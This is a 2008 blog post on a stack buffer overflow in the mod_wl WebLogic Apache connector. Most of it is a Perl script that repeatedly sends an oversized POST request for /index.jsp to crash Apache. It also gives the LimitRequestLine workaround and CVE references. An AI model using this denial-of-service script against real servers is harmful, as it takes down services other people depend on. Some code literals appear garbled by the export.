---
id: 30
title: BEA Weblogic Apache Connector Remote Buffer Overflow
date: 2008-07-31T23:00:00+00:00
author: Devin Ertel
layout: post
guid: http://www.infointox.net/?p=30
permalink: /?p=30
blogger_blog:
  - informationintoxication.blogspot.com
blogger_author:
  - Devinhttp://www.blogger.com/profile/15793900111446118223noreply@blogger.com
blogger_permalink:
  - /2008/07/bea-weblogic-apache-connector-remote.html
categories:
  - apache
  - overflow
  - weblogic
tags:
  - Buffer Overflow
  - Perl
---
<span style="font-weight: bold;">This post was delayed in release due to sensitivity.<br /> </span>
  
This vulnerability was a pretty fun one just because it affected so many people and it was just so simple to do.

This vulnerability is your standard stack based overflow. This particular overflow occurs in mod_wl which is a WebLogic connector for Apache. The overflow occurs when you send a long POST request for a .jsp. I started to look at KingCopes code but it just didn&#8217;t seem to work in my environment. So based off his code for the DOS, I wrote the one below to test with, nothing fancy.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="perl" style="font-family:monospace;"><span style="color: #000000; font-weight: bold;">use</span> IO<span style="color: #339933;">::</span><span style="color: #006600;">Socket</span><span style="color: #339933;">;</span>
<span style="color: #000000; font-weight: bold;">use</span> strict<span style="color: #339933;">;</span>
&nbsp;
<span style="color: #b1b100;">my</span> <span style="color: #0000ff;">$port</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$ARGV</span><span style="color: #009900;">&#91;</span><span style="color: #cc66cc;">1</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
<span style="color: #b1b100;">my</span> <span style="color: #0000ff;">$host</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$ARGV</span><span style="color: #009900;">&#91;</span><span style="color: #cc66cc;"></span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #b1b100;">my</span> <span style="color: #0000ff;">$dos</span><span style="color: #339933;">=</span><span style="color: #cc66cc;"></span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #b1b100;">while</span><span style="color: #009900;">&#40;</span><span style="color: #cc66cc;">1</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
&nbsp;
 <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #0000ff;">$dos</span> <span style="color: #b1b100;">eq</span> <span style="color: #cc66cc;">1</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
  <span style="color: #ff0000;">"Server is down<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #339933;">;</span>
          <span style="color: #000066;">exit</span><span style="color: #339933;">;</span>
 <span style="color: #009900;">&#125;</span>
&nbsp;
 <span style="color: #0000ff;">$a</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">"A"</span> x <span style="color: #cc66cc;">8000</span><span style="color: #339933;">;</span>
 <span style="color: #b1b100;">my</span> <span style="color: #0000ff;">$sock</span> <span style="color: #339933;">=</span> IO<span style="color: #339933;">::</span><span style="color: #006600;">Socket</span><span style="color: #339933;">::</span><span style="color: #006600;">INET</span><span style="color: #339933;">-&</span><span style="color: #b1b100;">gt</span><span style="color: #339933;">;</span><span style="color: #000000; font-weight: bold;">new</span><span style="color: #009900;">&#40;</span>PeerAddr <span style="color: #339933;">=&</span><span style="color: #b1b100;">gt</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$host</span><span style="color: #339933;">,</span>
                                         PeerPort <span style="color: #339933;">=&</span><span style="color: #b1b100;">gt</span><span style="color: #339933;">;</span> <span style="color: #0000ff;">$port</span><span style="color: #339933;">,</span>
                                         Proto <span style="color: #339933;">=&</span><span style="color: #b1b100;">gt</span><span style="color: #339933;">;</span> <span style="color: #ff0000;">'tcp'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
 <span style="color: #000066;">print</span> <span style="color: #0000ff;">$sock</span> <span style="color: #ff0000;">"POST /index.jsp $a<span style="color: #000099; font-weight: bold;">\r</span><span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\r</span><span style="color: #000099; font-weight: bold;">\n</span>Host: localhost<span style="color: #000099; font-weight: bold;">\r</span><span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\r</span><span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #339933;">;</span>
&nbsp;
 <span style="color: #000066;">read</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">$sock</span><span style="color: #339933;">,</span><span style="color: #0000ff;">$_</span><span style="color: #339933;">,</span><span style="color: #cc66cc;">100</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
 <span style="color: #000066;">print</span> <span style="color: #ff0000;">"=&gt;"</span> <span style="color: #339933;">.</span> <span style="color: #0000ff;">$_</span> <span style="color: #339933;">.</span> <span style="color: #ff0000;">"&lt;=<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: #339933;">;</span>
        <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #339933;">!</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">$_</span> <span style="color: #339933;">=~</span> <span style="color: #009966; font-style: italic;">/Server/</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
                        <span style="color: #0000ff;">$dos</span> <span style="color: #339933;">=</span> <span style="color: #cc66cc;">1</span><span style="color: #339933;">;</span>
                <span style="color: #009900;">&#125;</span>
 <span style="color: #000066;">close</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">$sock</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>        
<span style="color: #009900;">&#125;</span></pre>
      </td>
    </tr>
  </table>
</div>

The code above will seg fault Apache. The endless loop is needed because Apache recovers so quickly and it was an easy way to perform the DOS(took a couple of minutes). I have not had much time but I would like to explore this further and start debugging to see if code can be executed in a Linux environment.

<span style="font-weight: bold;">Fix:</span>
  
After all of my testing the workaround that was recommended by Oracle does work. They have not released a patch at this time.

With the workaround in place I even tried the DOS by sending a POST of 3999 to not trigger the LimitRequestLine. Apache handled the large repeating requests like a champ.

Workaround in apache conf:
  
<span style="font-weight: bold;">LimitRequestLine 4000<br /> </span>

[http://www.milw0rm.com](http://www.milw0rm.com/exploits/6089)
  
[http://cve.mitre.org](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3257)
  
[http://www.frsirt.com](http://www.frsirt.com/english/advisories/2008/2145)